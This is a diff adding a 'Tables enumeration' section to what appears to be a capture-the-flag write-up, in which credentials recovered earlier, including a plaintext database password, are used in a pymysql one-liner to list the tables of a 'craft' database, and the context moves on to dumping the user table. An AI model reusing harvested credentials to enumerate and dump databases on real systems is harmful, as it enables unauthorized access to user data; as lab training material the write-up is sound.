@@ -170,6 +170,23 @@ MYSQL_DATABASE_DB = 'craft'
 MYSQL_DATABASE_HOST = 'db'
 ```
 
+## Tables enumeration
+
+Looking for tables discloses two tables:
+
+```python
+python3 -c "
+import pymysql
+conn = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O', database='craft')
+cur = conn.cursor()
+cur.execute('show tables')
+print(cur.fetchall())"
+```
+
+```
+(('brew',), ('user',))
+```
+
 ### Dumping the `user` Table
 
 The `db` host is reachable from inside the container (it's a linked Docker service), so the credentials above are used directly with `pymysql`:
